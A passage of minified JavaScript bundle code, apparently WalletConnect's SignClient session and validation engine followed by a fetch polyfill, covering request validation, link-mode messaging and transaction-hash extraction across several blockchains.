${JSON.stringify(l)}`)}}),We(this,"validateNamespaces",(n,r)=>{const i=eTe(n,"connect()",r);if(i)throw new Error(i.message)}),We(this,"isValidApprove",async n=>{if(!Wo(n))throw new Error(Xe("MISSING_OR_INVALID",`approve() params: ${n}`).message);const{id:r,namespaces:i,relayProtocol:s,sessionProperties:o,scopedProperties:a}=n;this.checkRecentlyDeleted(r),await this.isValidProposalId(r);const c=this.client.proposal.get(r),l=T9(i,"approve()");if(l)throw new Error(l.message);const f=kq(c.requiredNamespaces,i,"approve()");if(f)throw new Error(f.message);if(!Ni(s,!0)){const{message:h}=Xe("MISSING_OR_INVALID",`approve() relayProtocol: ${s}`);throw new Error(h)}if(o&&!es(o)&&this.validateSessionProps(o,"sessionProperties"),a&&!es(a)){this.validateSessionProps(a,"scopedProperties");const h=new Set(Object.keys(i));if(!Object.keys(a).every(m=>h.has(m.split(":")[0])))throw new Error(`Scoped properties must be a subset of approved namespaces, received: ${JSON.stringify(a)}, approved namespaces: ${Array.from(h).join(", ")}`)}}),We(this,"isValidReject",async n=>{if(!Wo(n)){const{message:s}=Xe("MISSING_OR_INVALID",`reject() params: ${n}`);throw new Error(s)}const{id:r,reason:i}=n;if(this.checkRecentlyDeleted(r),await this.isValidProposalId(r),!rTe(i)){const{message:s}=Xe("MISSING_OR_INVALID",`reject() reason: ${JSON.stringify(i)}`);throw new Error(s)}}),We(this,"isValidSessionSettleRequest",n=>{if(!Wo(n)){const{message:l}=Xe("MISSING_OR_INVALID",`onSessionSettleRequest() params: ${n}`);throw new Error(l)}const{relay:r,controller:i,namespaces:s,expiry:o}=n;if(!Noe(r)){const{message:l}=Xe("MISSING_OR_INVALID","onSessionSettleRequest() relay protocol should be a string");throw new Error(l)}const a=K4e(i,"onSessionSettleRequest()");if(a)throw new Error(a.message);const c=T9(s,"onSessionSettleRequest()");if(c)throw new Error(c.message);if(Ol(o)){const{message:l}=Xe("EXPIRED","onSessionSettleRequest()");throw new Error(l)}}),We(this,"isValidUpdate",async n=>{if(!Wo(n)){const{message:c}=Xe("MISSING_OR_INVALID",`update() params: ${n}`);throw new Error(c)}const{topic:r,namespaces:i}=n;this.checkRecentlyDeleted(r),await this.isValidSessionTopic(r);const s=this.client.session.get(r),o=T9(i,"update()");if(o)throw new Error(o.message);const a=kq(s.requiredNamespaces,i,"update()");if(a)throw new Error(a.message)}),We(this,"isValidExtend",async n=>{if(!Wo(n)){const{message:i}=Xe("MISSING_OR_INVALID",`extend() params: ${n}`);throw new Error(i)}const{topic:r}=n;this.checkRecentlyDeleted(r),await this.isValidSessionTopic(r)}),We(this,"isValidRequest",async n=>{if(!Wo(n)){const{message:c}=Xe("MISSING_OR_INVALID",`request() params: ${n}`);throw new Error(c)}const{topic:r,request:i,chainId:s,expiry:o}=n;this.checkRecentlyDeleted(r),await this.isValidSessionTopic(r);const{namespaces:a}=this.client.session.get(r);if(!Oq(a,s)){const{message:c}=Xe("MISSING_OR_INVALID",`request() chainId: ${s}`);throw new Error(c)}if(!iTe(i)){const{message:c}=Xe("MISSING_OR_INVALID",`request() ${JSON.stringify(i)}`);throw new Error(c)}if(!aTe(a,s,i.method)){const{message:c}=Xe("MISSING_OR_INVALID",`request() method: ${i.method}`);throw new Error(c)}this.validateRequestExpiry(o)}),We(this,"isValidRespond",async n=>{var r;if(!Wo(n)){const{message:a}=Xe("MISSING_OR_INVALID",`respond() params: ${n}`);throw new Error(a)}const{topic:i,response:s}=n;try{await this.isValidSessionTopic(i)}catch(a){throw(r=n?.response)!=null&&r.id&&this.cleanupAfterResponse(n),a}if(!sTe(s)){const{message:a}=Xe("MISSING_OR_INVALID",`respond() response: ${JSON.stringify(s)}`);throw new Error(a)}const o=this.client.pendingRequest.get(s.id);if(o.topic!==i){const{message:a}=Xe("MISMATCHED_TOPIC",`Request response topic mismatch. reqId: ${s.id}, expected topic: ${o.topic}, received topic: ${i}`);throw new Error(a)}}),We(this,"isValidPing",async n=>{if(!Wo(n)){const{message:i}=Xe("MISSING_OR_INVALID",`ping() params: ${n}`);throw new Error(i)}const{topic:r}=n;await this.isValidSessionOrPairingTopic(r)}),We(this,"isValidEmit",async n=>{if(!Wo(n)){const{message:a}=Xe("MISSING_OR_INVALID",`emit() params: ${n}`);throw new Error(a)}const{topic:r,event:i,chainId:s}=n;await this.isValidSessionTopic(r);const{namespaces:o}=this.client.session.get(r);if(!Oq(o,s)){const{message:a}=Xe("MISSING_OR_INVALID",`emit() chainId: ${s}`);throw new Error(a)}if(!oTe(i)){const{message:a}=Xe("MISSING_OR_INVALID",`emit() event: ${JSON.stringify(i)}`);throw new Error(a)}if(!cTe(o,s,i.name)){const{message:a}=Xe("MISSING_OR_INVALID",`emit() event: ${JSON.stringify(i)}`);throw new Error(a)}}),We(this,"isValidDisconnect",async n=>{if(!Wo(n)){const{message:i}=Xe("MISSING_OR_INVALID",`disconnect() params: ${n}`);throw new Error(i)}const{topic:r}=n;await this.isValidSessionOrPairingTopic(r)}),We(this,"isValidAuthenticate",n=>{const{chains:r,uri:i,domain:s,nonce:o}=n;if(!Array.isArray(r)||r.length===0)throw new Error("chains is required and must be a non-empty array");if(!Ni(i,!1))throw new Error("uri is required parameter");if(!Ni(s,!1))throw new Error("domain is required parameter");if(!Ni(o,!1))throw new Error("nonce is required parameter");if([...new Set(r.map(c=>_f(c).namespace))].length>1)throw new Error("Multi-namespace requests are not supported. Please request single namespace only.");const{namespace:a}=_f(r[0]);if(a!=="eip155")throw new Error("Only eip155 namespace is supported for authenticated sessions. Please use .connect() for non-eip155 chains.")}),We(this,"getVerifyContext",async n=>{const{attestationId:r,hash:i,encryptedId:s,metadata:o,transportType:a}=n,c={verified:{verifyUrl:o.verifyUrl||cE,validation:"UNKNOWN",origin:o.url||""}};try{if(a===Or.link_mode){const f=this.getAppLinkIfEnabled(o,a);return c.verified.validation=f&&new URL(f).origin===new URL(o.url).origin?"VALID":"INVALID",c}const l=await this.client.core.verify.resolve({attestationId:r,hash:i,encryptedId:s,verifyUrl:o.verifyUrl});l&&(c.verified.origin=l.origin,c.verified.isScam=l.isScam,c.verified.validation=l.origin===new URL(o.url).origin?"VALID":"INVALID")}catch(l){this.client.logger.warn(l)}return this.client.logger.debug(`Verify context: ${JSON.stringify(c)}`),c}),We(this,"validateSessionProps",(n,r)=>{Object.values(n).forEach((i,s)=>{if(i==null){const{message:o}=Xe("MISSING_OR_INVALID",`${r} must contain an existing value for each key. Received: ${i} for key ${Object.keys(n)[s]}`);throw new Error(o)}})}),We(this,"getPendingAuthRequest",n=>{const r=this.client.auth.requests.get(n);return typeof r=="object"?r:void 0}),We(this,"addToRecentlyDeleted",(n,r)=>{if(this.recentlyDeletedMap.set(n,r),this.recentlyDeletedMap.size>=this.recentlyDeletedLimit){let i=0;const s=this.recentlyDeletedLimit/2;for(const o of this.recentlyDeletedMap.keys()){if(i++>=s)break;this.recentlyDeletedMap.delete(o)}}}),We(this,"checkRecentlyDeleted",n=>{const r=this.recentlyDeletedMap.get(n);if(r){const{message:i}=Xe("MISSING_OR_INVALID",`Record was recently deleted - ${r}: ${n}`);throw new Error(i)}}),We(this,"isLinkModeEnabled",(n,r)=>{var i,s,o,a,c,l,f,h,m;return!n||r!==Or.link_mode?!1:((s=(i=this.client.metadata)==null?void 0:i.redirect)==null?void 0:s.linkMode)===!0&&((a=(o=this.client.metadata)==null?void 0:o.redirect)==null?void 0:a.universal)!==void 0&&((l=(c=this.client.metadata)==null?void 0:c.redirect)==null?void 0:l.universal)!==""&&((f=n?.redirect)==null?void 0:f.universal)!==void 0&&((h=n?.redirect)==null?void 0:h.universal)!==""&&((m=n?.redirect)==null?void 0:m.linkMode)===!0&&this.client.core.linkModeSupportedApps.includes(n.redirect.universal)&&typeof(global==null?void 0:global.Linking)<"u"}),We(this,"getAppLinkIfEnabled",(n,r)=>{var i;return this.isLinkModeEnabled(n,r)?(i=n?.redirect)==null?void 0:i.universal:void 0}),We(this,"handleLinkModeMessage",({url:n})=>{if(!n||!n.includes("wc_ev")||!n.includes("topic"))return;const r=qz(n,"topic")||"",i=decodeURIComponent(qz(n,"wc_ev")||""),s=this.client.session.keys.includes(r);s&&this.client.session.update(r,{transportType:Or.link_mode}),this.client.core.dispatchEnvelope({topic:r,message:i,sessionExists:s})}),We(this,"registerLinkModeListeners",async()=>{var n;if(CB()||Gp()&&(n=this.client.metadata.redirect)!=null&&n.linkMode){const r=global==null?void 0:global.Linking;if(typeof r<"u"){r.addEventListener("url",this.handleLinkModeMessage,this.client.name);const i=await r.getInitialURL();i&&setTimeout(()=>{this.handleLinkModeMessage({url:i})},50)}}}),We(this,"getTVFApproveParams",n=>{try{const r=Roe(n.namespaces),i=B4e(n.namespaces),s=j4e(n.namespaces),o=n.sessionProperties,a=n.scopedProperties;return{approvedChains:r,approvedMethods:i,approvedEvents:s,sessionProperties:o,scopedProperties:a}}catch(r){return this.client.logger.warn(r,"Error getting TVF approve params"),{}}}),We(this,"getTVFParams",(n,r,i)=>{var s,o,a;if(!((s=r.request)!=null&&s.method))return{};const c={correlationId:n,rpcMethods:[r.request.method],chainId:r.chainId};try{const l=this.extractTxHashesFromResult(r.request,i);c.txHashes=l,c.contractAddresses=this.isValidContractData(r.request.params)?[(a=(o=r.request.params)==null?void 0:o[0])==null?void 0:a.to]:[]}catch(l){this.client.logger.warn(l,"Error getting TVF params")}return c}),We(this,"isValidContractData",n=>{var r;if(!n)return!1;try{const i=n?.data||((r=n?.[0])==null?void 0:r.data);if(!i.startsWith("0x"))return!1;const s=i.slice(2);return/^[0-9a-fA-F]*$/.test(s)?s.length%2===0:!1}catch{}return!1}),We(this,"extractTxHashesFromResult",(n,r)=>{var i;try{if(!r)return[];const s=n.method,o=MRe[s];if(s==="sui_signTransaction")return[CCe(r.transactionBytes)];if(s==="near_signTransaction")return[Jz(r)];if(s==="near_signTransactions")return r.map(c=>Jz(c));if(s==="xrpl_signTransactionFor"||s==="xrpl_signTransaction")return[(i=r.tx_json)==null?void 0:i.hash];if(s==="polkadot_signTransaction")return[TTe({transaction:n.params.transactionPayload,signature:r.signature})];if(s==="algo_signTxn")return Cf(r)?r.map(c=>Xz(c)):[Xz(r)];if(s==="cosmos_signDirect")return[TCe(r)];if(s==="wallet_sendCalls")return xCe(r);if(typeof r=="string")return[r];const a=r[o.key];if(Cf(a))return s==="solana_signAllTransactions"?a.map(c=>ACe(c)):a;if(typeof a=="string")return[a]}catch(s){this.client.logger.warn(s,"Error extracting tx hashes from result")}return[]})}async processPendingMessageEvents(){try{const e=this.client.session.keys,n=this.client.core.relayer.messages.getWithoutAck(e);for(const[r,i]of Object.entries(n))for(const s of i)try{await this.onProviderMessageEvent({topic:r,message:s,publishedAt:Date.now()})}catch{this.client.logger.warn(`Error processing pending message event for topic: ${r}, message: ${s}`)}}catch(e){this.client.logger.warn(e,"processPendingMessageEvents failed")}}isInitialized(){if(!this.initialized){const{message:e}=Xe("NOT_INITIALIZED",this.name);throw new Error(e)}}async confirmOnlineStateOrThrow(){await this.client.core.relayer.confirmOnlineStateOrThrow()}registerRelayerEvents(){this.client.core.relayer.on(Ri.message,e=>{this.onProviderMessageEvent(e)})}async onRelayMessage(e){const{topic:n,message:r,attestation:i,transportType:s}=e,{publicKey:o}=this.client.auth.authKeys.keys.includes(KT)?this.client.auth.authKeys.get(KT):{publicKey:void 0};try{const a=await this.client.core.crypto.decode(n,r,{receiverPublicKey:o,encoding:s===Or.link_mode?hp:Yo});MB(a)?(this.client.core.history.set(n,a),await this.onRelayEventRequest({topic:n,payload:a,attestation:i,transportType:s,encryptedId:Pc(r)})):o8(a)?(await this.client.core.history.resolve(a),await this.onRelayEventResponse({topic:n,payload:a,transportType:s}),this.client.core.history.delete(n,a.id)):(this.client.logger.error(`onRelayMessage() -> unknown payload: ${JSON.stringify(a)}`),await this.onRelayEventUnknownPayload({topic:n,payload:a,transportType:s})),await this.client.core.relayer.messages.ack(n,r)}catch(a){this.client.logger.error(`onRelayMessage() -> failed to process an inbound message: ${r}`),this.client.logger.error(a)}}registerExpirerEvents(){this.client.core.expirer.on(Ic.expired,async e=>{const{topic:n,id:r}=Pse(e.target);if(r&&this.client.pendingRequest.keys.includes(r))return await this.deletePendingSessionRequest(r,Xe("EXPIRED"),!0);if(r&&this.client.auth.requests.keys.includes(r))return await this.deletePendingAuthRequest(r,Xe("EXPIRED"),!0);n?this.client.session.keys.includes(n)&&(await this.deleteSession({topic:n,expirerHasDeleted:!0}),this.client.events.emit("session_expire",{topic:n})):r&&(await this.deleteProposal(r,!0),this.client.events.emit("proposal_expire",{id:r}))})}registerPairingEvents(){this.client.core.pairing.events.on(xm.create,e=>this.onPairingCreated(e)),this.client.core.pairing.events.on(xm.delete,e=>{this.addToRecentlyDeleted(e.topic,"pairing")})}isValidPairingTopic(e){if(!Ni(e,!1)){const{message:n}=Xe("MISSING_OR_INVALID",`pairing topic should be a string: ${e}`);throw new Error(n)}if(!this.client.core.pairing.pairings.keys.includes(e)){const{message:n}=Xe("NO_MATCHING_KEY",`pairing topic doesn't exist: ${e}`);throw new Error(n)}if(Ol(this.client.core.pairing.pairings.get(e).expiry)){const{message:n}=Xe("EXPIRED",`pairing topic: ${e}`);throw new Error(n)}}async isValidSessionTopic(e){if(!Ni(e,!1)){const{message:n}=Xe("MISSING_OR_INVALID",`session topic should be a string: ${e}`);throw new Error(n)}if(this.checkRecentlyDeleted(e),!this.client.session.keys.includes(e)){const{message:n}=Xe("NO_MATCHING_KEY",`session topic doesn't exist: ${e}`);throw new Error(n)}if(Ol(this.client.session.get(e).expiry)){await this.deleteSession({topic:e});const{message:n}=Xe("EXPIRED",`session topic: ${e}`);throw new Error(n)}if(!this.client.core.crypto.keychain.has(e)){const{message:n}=Xe("MISSING_OR_INVALID",`session topic does not exist in keychain: ${e}`);throw await this.deleteSession({topic:e}),new Error(n)}}async isValidSessionOrPairingTopic(e){if(this.checkRecentlyDeleted(e),this.client.session.keys.includes(e))await this.isValidSessionTopic(e);else if(this.client.core.pairing.pairings.keys.includes(e))this.isValidPairingTopic(e);else if(Ni(e,!1)){const{message:n}=Xe("NO_MATCHING_KEY",`session or pairing topic doesn't exist: ${e}`);throw new Error(n)}else{const{message:n}=Xe("MISSING_OR_INVALID",`session or pairing topic should be a string: ${e}`);throw new Error(n)}}async isValidProposalId(e){if(!nTe(e)){const{message:n}=Xe("MISSING_OR_INVALID",`proposal id should be a number: ${e}`);throw new Error(n)}if(!this.client.proposal.keys.includes(e)){const{message:n}=Xe("NO_MATCHING_KEY",`proposal id doesn't exist: ${e}`);throw new Error(n)}if(Ol(this.client.proposal.get(e).expiryTimestamp)){await this.deleteProposal(e);const{message:n}=Xe("EXPIRED",`proposal id: ${e}`);throw new Error(n)}}validateRequestExpiry(e){if(e&&!dTe(e,k9)){const{message:n}=Xe("MISSING_OR_INVALID",`request() expiry: ${e}. Expiry must be a number (in seconds) between ${k9.min} and ${k9.max}`);throw new Error(n)}}}class QRe extends zg{constructor(e,n){super(e,n,DRe,LB),this.core=e,this.logger=n}}let JRe=class extends zg{constructor(e,n){super(e,n,BRe,LB),this.core=e,this.logger=n}};class XRe extends zg{constructor(e,n){super(e,n,URe,LB,r=>r.id),this.core=e,this.logger=n}}class ePe extends zg{constructor(e,n){super(e,n,HRe,c8,()=>KT),this.core=e,this.logger=n}}class tPe extends zg{constructor(e,n){super(e,n,zRe,c8),this.core=e,this.logger=n}}class nPe extends zg{constructor(e,n){super(e,n,qRe,c8,r=>r.id),this.core=e,this.logger=n}}var rPe=Object.defineProperty,iPe=(t,e,n)=>e in t?rPe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,D9=(t,e,n)=>iPe(t,typeof e!="symbol"?e+"":e,n);class sPe{constructor(e,n){this.core=e,this.logger=n,D9(this,"authKeys"),D9(this,"pairingTopics"),D9(this,"requests"),this.authKeys=new ePe(this.core,this.logger),this.pairingTopics=new tPe(this.core,this.logger),this.requests=new nPe(this.core,this.logger)}async init(){await this.authKeys.init(),await this.pairingTopics.init(),await this.requests.init()}}var oPe=Object.defineProperty,aPe=(t,e,n)=>e in t?oPe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,bn=(t,e,n)=>aPe(t,typeof e!="symbol"?e+"":e,n);class FB extends rve{constructor(e){super(e),bn(this,"protocol",eae),bn(this,"version",tae),bn(this,"name",O9.name),bn(this,"metadata"),bn(this,"core"),bn(this,"logger"),bn(this,"events",new Wc.EventEmitter),bn(this,"engine"),bn(this,"session"),bn(this,"proposal"),bn(this,"pendingRequest"),bn(this,"auth"),bn(this,"signConfig"),bn(this,"on",(r,i)=>this.events.on(r,i)),bn(this,"once",(r,i)=>this.events.once(r,i)),bn(this,"off",(r,i)=>this.events.off(r,i)),bn(this,"removeListener",(r,i)=>this.events.removeListener(r,i)),bn(this,"removeAllListeners",r=>this.events.removeAllListeners(r)),bn(this,"connect",async r=>{try{return await this.engine.connect(r)}catch(i){throw this.logger.error(i.message),i}}),bn(this,"pair",async r=>{try{return await this.engine.pair(r)}catch(i){throw this.logger.error(i.message),i}}),bn(this,"approve",async r=>{try{return await this.engine.approve(r)}catch(i){throw this.logger.error(i.message),i}}),bn(this,"reject",async r=>{try{return await this.engine.reject(r)}catch(i){throw this.logger.error(i.message),i}}),bn(this,"update",async r=>{try{return await this.engine.update(r)}catch(i){throw this.logger.error(i.message),i}}),bn(this,"extend",async r=>{try{return await this.engine.extend(r)}catch(i){throw this.logger.error(i.message),i}}),bn(this,"request",async r=>{try{return await this.engine.request(r)}catch(i){throw this.logger.error(i.message),i}}),bn(this,"respond",async r=>{try{return await this.engine.respond(r)}catch(i){throw this.logger.error(i.message),i}}),bn(this,"ping",async r=>{try{return await this.engine.ping(r)}catch(i){throw this.logger.error(i.message),i}}),bn(this,"emit",async r=>{try{return await this.engine.emit(r)}catch(i){throw this.logger.error(i.message),i}}),bn(this,"disconnect",async r=>{try{return await this.engine.disconnect(r)}catch(i){throw this.logger.error(i.message),i}}),bn(this,"find",r=>{try{return this.engine.find(r)}catch(i){throw this.logger.error(i.message),i}}),bn(this,"getPendingSessionRequests",()=>{try{return this.engine.getPendingSessionRequests()}catch(r){throw this.logger.error(r.message),r}}),bn(this,"authenticate",async(r,i)=>{try{return await this.engine.authenticate(r,i)}catch(s){throw this.logger.error(s.message),s}}),bn(this,"formatAuthMessage",r=>{try{return this.engine.formatAuthMessage(r)}catch(i){throw this.logger.error(i.message),i}}),bn(this,"approveSessionAuthenticate",async r=>{try{return await this.engine.approveSessionAuthenticate(r)}catch(i){throw this.logger.error(i.message),i}}),bn(this,"rejectSessionAuthenticate",async r=>{try{return await this.engine.rejectSessionAuthenticate(r)}catch(i){throw this.logger.error(i.message),i}}),this.name=e?.name||O9.name,this.metadata=g6e(e?.metadata),this.signConfig=e?.signConfig;const n=BB({logger:e?.logger||O9.logger,name:this.name});this.logger=n,this.core=e?.core||new kRe(e),this.session=new JRe(this.core,this.logger),this.proposal=new QRe(this.core,this.logger),this.pendingRequest=new XRe(this.core,this.logger),this.engine=new YRe(this),this.auth=new sPe(this.core,this.logger)}static async init(e){const n=new FB(e);return await n.initialize(),n}get context(){return oa(this.logger)}get pairing(){return this.core.pairing.pairings}async initialize(){this.logger.trace("Initialized");try{await this.core.start(),await this.session.init(),await this.proposal.init(),await this.pendingRequest.init(),await this.auth.init(),await this.engine.init(),this.logger.info("SignClient Initialization Success")}catch(e){throw this.logger.info("SignClient Initialization Failure"),this.logger.error(e.message),e}}}const cPe=FB;var Z3={exports:{}},yV;function uPe(){return yV||(yV=1,(function(t,e){var n=typeof globalThis<"u"&&globalThis||typeof self<"u"&&self||typeof Nl<"u"&&Nl,r=(function(){function s(){this.fetch=!1,this.DOMException=n.DOMException}return s.prototype=n,new s})();(function(s){(function(o){var a=typeof s<"u"&&s||typeof self<"u"&&self||typeof Nl<"u"&&Nl||{},c={searchParams:"URLSearchParams"in a,iterable:"Symbol"in a&&"iterator"in Symbol,blob:"FileReader"in a&&"Blob"in a&&(function(){try{return new Blob,!0}catch{return!1}})(),formData:"FormData"in a,arrayBuffer:"ArrayBuffer"in a};function l(P){return P&&DataView.prototype.isPrototypeOf(P)}if(c.arrayBuffer)var f=["[object Int8Array]","[object Uint8Array]","[object Uint8ClampedArray]","[object Int16Array]","[object Uint16Array]","[object Int32Array]","[object Uint32Array]","[object Float32Array]","[object Float64Array]"],h=ArrayBuffer.isView||function(P){return P&&f.indexOf(Object.prototype.toString.call(P))>-1};function m(P){if(typeof P!="string"&&(P=String(P)),/[^a-z0-9\-#$%&'*+.^_`|~!]/i.test(P)||P==="")throw new TypeError('Invalid character in header field name: "'+P+'"');return P.toLowerCase()}function b(P){return typeof P!="string"&&(P=String(P)),P}function w(P){var C={next:function(){var j=P.shift();return{done:j===void 0,value:j}}};return c.iterable&&(C[Symbol.iterator]=function(){return C}),C}function y(P){this.map={},P instanceof y?P.forEach(function(C,j){this.append(j,C)},this):Array.isArray(P)?P.forEach(function(C){if(C.length!=2)throw new TypeError("Headers constructor: expected name/value pair to be length 2, found"+C.length);this.append(C[0],C[1])},this):P&&Object.getOwnPropertyNames(P).forEach(function(C){this.append(C,P[C])},this)}y.prototype.append=function(P,C){P=m(P),C=b(C);var j=this.map[P];this.map[P]=j?j+", "+C:C},y.prototype.delete=function(P){delete this.map[m(P)]},y.prototype.get=function(P){return P=m(P),this.has(P)?this.map[P]:null},y.prototype.has=function(P){return this.map.hasOwnProperty(m(P))},y.prototype.set=function(P,C){this.map[m(P)]=b(C)},y.prototype.forEach=function(P,C){for(var j in this.map)this.map.hasOwnProperty(j)&&P.call(C,this.map[j],j,this)},y.prototype.keys=function(){var P=[];return this.forEach(function(C,j){P.push(j)}),w(P)},y.prototype.values=function(){var P=[];return this.forEach(function(C){P.push(C)}),w(P)},y.prototype.entries=function(){var P=[];return this.forEach(function(C,j){P.push([j,C])}),w(P)},c.iterable&&(y.prototype[Symbol.iterator]=y.prototype.entries);function E(P){if(!P._noBody){if(P.bodyUsed)return Promise.reject(new TypeError("Already read"));P.bodyUsed=!0}}function A(P){return new Promise(function(C,j){P.onload=function(){C(P.result)},P.onerror=function(){j(P.error)}})}function R(P){var C=new FileReader,j=A(C);return C.readAsArrayBuffer(P),j}function S(P){var C=new FileReader,j=A(C),z=/charset=([A-Za-z0-9_-]+)/.exec(P.type),$=z?z[1]:"utf-8";return C.readAsText(P,$),j}function v(P){for(var C=new Uint8Array(P),j=new Array(C.length),z=0;z<C.length;z++)j[z]=String.fromCharCode(C[z]);return j.join("")}function k(P){if(P.slice)return P.slice(0);var C=new Uint8Array(P.byteLength);return C.set(new Uint8Array(P)),C.buffer}function O(){return this.bodyUsed=!1,this._initBody=function(P){this.bodyUsed=this.bodyUsed,this._bodyInit=P,P?typeof P=="string"?this._bodyText=P:c.blob&&Blob.prototype.isPrototypeOf(P)?this._bodyBlob=P:c.formData&&FormData.prototype.isPrototypeOf(P)?this._bodyFormData=P:c.searchParams&&URLSearchParams.prototype.isPrototypeOf(P)?this._bodyText=P.toString():c.arrayBuffer&&c.blob&&l(P)?(this._bodyArrayBuffer=k(P.buffer),this._bodyInit=new Blob([this._bodyArrayBuffer])):c.arrayBuffer&&(ArrayBuffer.prototype.isPrototypeOf(P)||h(P))?this._bodyArrayBuffer=k(P):this._bodyText=P=Object.prototype.toString.call(P):(this._noBody=!0,this._bodyText=""),this.headers.get("content-type")||(typeof P=="string"?this.headers.set("content-type","text/plain;charset=UTF-8"):this._bodyBlob&&this._bodyBlob.type?this.headers.set("content-type",this._bodyBlob.type):c.searchParams&&URLSearchParams.prototype.isPrototypeOf(P)&&this.headers.set("content-type","application/x-www-form-urlencoded;charset=UTF-8"))},c.blob&&(this.blob=function(){var P=E(this);if(P)return P;if(this._bodyBlob)return Promise.resolve(this._bodyBlob);if(this._bodyArrayBuffer)return Promise.resolve(new Blob([this._bodyArrayBuffer]));if(this._bodyFormData)throw new Error("could not read FormData body as blob");return Promise.resolve(new Blob([this._bodyText]))}),this.arrayBuffer=function(){if(this._bodyArrayBuffer){var P=E(this);return P||(ArrayBuffer.isView(this._bodyArrayBuffer)?Promise.resolve(this._bodyArrayBuffer.buffer.slice(this._bodyArrayBuffer.byteOffset,this._bodyArrayBuffer.byteOffset+this._bodyArrayBuffer.byteLength)):Promise.resolve(this._bodyArrayBuffer))}else{if(c.blob)return this.blob().then(R);throw new Error("could not read as ArrayBuffer")}},this.text=function(){var P=E(this);if(P)return P;if(this._bodyBlob)return S(this._bodyBlob);if(this._bodyArrayBuffer)return Promise.resolve(v(this._bodyArrayBuffer));if(this._bodyFormData)throw new Error("could not read FormData body as text");return Promise.resolve(this._bodyText)},c.formData&&(this.formData=function(){return this.text().then(B)}),this.json=function(){return this.text().then(JSON.parse)},this}var _=["CONNECT","DELETE","GET","HEAD","OPTIONS","PATCH","POST","PUT","TRACE"];function I(P){var C=P.toUpperCase();return _.indexOf(C)>-1?C:P}function T(P,C){if(!(this instanceof T))throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');C=C||{};var j=C.body;if(P instanceof T){if(P.bodyUsed)throw new TypeError("Already read");this.url=P.url,this.credentials=P.credentials,C.headers||(this.headers=new y(P.headers)),this.method=P.method,this.mode=P.mode,this.signal=P.signal,!j&&P._bodyInit!=null&&(j=P._bodyInit,P.bodyUsed=!0)}else this.url=String(P);if(this.credentials=C.credentials||this.credentials||"same-origin",(C.headers||!this.headers)&&(this.headers=new y(C.headers)),this.method=I(C.method||this.method||"GET"),this.mode=C.mode||this.mode||null,this.signal=C.signal||this.signal||(function(){if("AbortController"in a){var H=new AbortController;return H.signal}})(),this.referrer=null,(this.method==="GET"||this.method==="HEAD")&&j)throw new TypeError("Body not allowed for GET or HEAD requests");if(this._initBody(j),(this.method==="GET"||this.method==="HEAD")&&(C.cache==="no-store"||C.cache==="no-cache")){var z=/([?&])_=[^&]*/;if(z.test(this.url))this.url=this.url.replace(z,"$1_="+new Date().getTime());else{var $=/\?/;this.url+=($.test(this.url)?"&":"?")+"_="+new Date().getTime()}}}T.prototype.clone=function(){return new T(this,{body:this._bodyInit})};function B(P){var C=new FormData;return P.trim().split("&").forEach(function(j){if(j){var z=j.split("="),$=z.shift().replace(/\+/g," "),H=z.join("=").replace(/\+/g," ");C.append(decodeURIComponent($),decodeURIComponent(H))}}),C}function U(P){var C=new y,j=P.replace(/\r?\n[\t ]+/g," ");return j.split("\r").map(function(z){return z.indexOf(`
`)===0?z.substr(1,z.length):z}).forEach(function(z){var $=z.split(":"),H=$.shift().trim();if(H){var L=$.join(":").trim();try{C.append(H,L)}catch(V){console.warn("Response "+V.message)}}}),C}O.call(T.prototype);function M(P,C){if(!(this instanceof M))throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');if(C||(C={}),this.type="default",this.status=C.status===void 0?200:C.status,this.status<200||this.status>599)throw new RangeError("Failed to construct 'Response': The status provided (0) is outside the range [200, 599].");this.ok=this.status>=200&&this.status<300,this.statusText=C.statusText===void 0?"":""+C.statusText,this.headers=new y(C.headers),this.url=C.url||"",this._initBody(P)}O.call(M.prototype),M.prototype.clone=function(){return new M(this._bodyInit,{status:this.status,statusText:this.statusText,headers:new y(this.headers),url:this.url})},M.error=function(){var P=new M(null,{status:200,statusText:""});return P.ok=!1,P.status=0,P.type="error",P};var N=[301,302,303,307,308];M.redirect=function(P,C){if(N.indexOf(C)===-1)throw new RangeError("Invalid status code");return new M(null,{status:C,headers:{location:P}})},o.DOMException=a.DOMException;try{new o.DOMException}catch{o.DOMException=function(C,j){this.message=C,this.name=j;var z=Error(C);this.stack=z.stack},o.DOMException.prototype=Object.create(Error.prototype),o.DOMException.prototype.constructor=o.DOMException}function q(P,C){return new Promise(function(j,z){var $=new T(P,C);if($.signal&&$.signal.aborted)return z(new o.DOMException("Aborted","AbortError"));var H=new XMLHttpRequest;function L(){H.abort()}H.onload=function(){var Z={statusText:H.statusText,headers:U(H.getAllResponseHeaders()||"")};$.url.indexOf("file://")===0&&(H.status<200||H.status>599)?Z.status=200:Z.status=H.status,Z.url="responseURL"in H?H.responseURL:Z.headers.get("X-Request-URL");var J="response"in H?H.response:H.responseText;setTimeout(function(){j(new M(J,Z))},0)},H.onerror=function(){setTimeout(function(){z(new TypeError("Network request failed"))},0)},H.ontimeout=function(){setTimeout(function(){z(new TypeError("Network request timed out"))},0)},H.onabort=function(){setTimeout(function(){z(new o.DOMException("Aborted","AbortError"))},0)};function V(Z){try{return Z===""&&a.location.href?a.location.href:Z}catch{return Z}}if(H.open($.method,V($.url),!0),$.credentials==="include"?H.withCredentials=!0:$.credentials==="omit"&&(H.withCredentials=!1),"responseType"in H&&(c.blob?H.responseType="blob":c.arrayBuffer&&(H.responseType="arraybuffer")),C&&typeof C.headers=="object"&&!(C.headers instanceof y||a.Headers&&C.headers instanceof a.Headers)){var G=[];Object.getOwnPropertyNames(C.headers).forEach(function(Z){G.push(m(Z)),H.setRequestHeader(Z,b(C.headers[Z]))}),$.headers.forEach(function(Z,J){G.indexOf(J)===-1&&H.setRequestHeader(J,Z)})}else $.headers.forEach(function(Z,J){H.setRequestHeader(J,Z)});$.signal&&($.signal.addEventListener("abort",L),H.onreadystatechange=function(){H.readyState===4&&$.signal.removeEventListener("abort",L)}),H.send(typeof $._bodyInit>"u"?null:$._bodyInit)})}return q.polyfill=!0,a.fetch||(a.fetch=q,a.Headers=y,a.Request=T,a.Response=M),o.Headers=y,o.Request=T,o.Response=M,o.fetch=q,Object.defineProperty(o,"__esModule",{value:!0}),o})({})})(r),r.fetch.ponyfill=!0,delete r.fetch.polyfill;var 